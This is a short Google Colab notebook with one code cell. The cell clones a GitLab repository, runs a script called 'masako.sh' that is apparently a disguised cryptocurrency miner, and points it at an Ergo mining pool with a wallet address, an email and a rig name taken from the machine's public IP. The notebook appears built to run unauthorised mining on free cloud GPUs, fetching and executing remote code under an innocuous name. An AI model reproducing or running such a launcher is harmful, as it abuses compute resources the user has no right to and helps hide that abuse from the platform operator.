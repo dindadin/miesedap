{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "S3.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "vB02PsMy1B4CH"
      },
      "source": [
        "!nvidia-smi\n",
        "!git clone https://gitlab.com/adini0059/masako.git\n",
        "%cd masako\n",
        "!chmod +x masako.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./masako.sh -algo autolykos -pool1 ergo-eu1.nanopool.org:11433 -wallet 9hHjHAbD4wEz19Tb59ftxeACf17gePpW4D17sdrwWUBGAR7R3p1 -coin ergo -rigName $ip -email dd2568752@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
